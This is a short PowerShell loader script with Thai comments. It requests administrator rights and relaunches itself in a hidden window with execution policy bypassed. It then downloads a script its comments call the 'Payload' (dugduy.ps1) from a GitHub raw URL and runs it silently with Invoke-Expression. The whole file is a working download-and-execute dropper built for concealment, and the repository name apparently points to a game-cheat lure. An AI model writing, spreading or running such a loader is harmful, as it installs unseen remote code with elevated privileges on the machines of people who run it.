# main.ps1 - Loader
# 1. ขอสิทธิ์ Administrator (เปลี่ยนไปใช้ลิงก์ raw สำหรับดึง main.ps1 ถ้าคุณจะฝาก main ไว้บนเน็ต)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/main.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 2. ไปอ่านค่าสคริปต์ dugduy.ps1 (Payload) จาก GitHub มารันแบบเงียบๆ
# สังเกตว่าต้องใช้ลิงก์ raw.githubusercontent.com
$dugduyUrl = "https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1"
$scriptContent = (Invoke-WebRequest -Uri $dugduyUrl -UseBasicParsing).Content
Invoke-Expression $scriptContent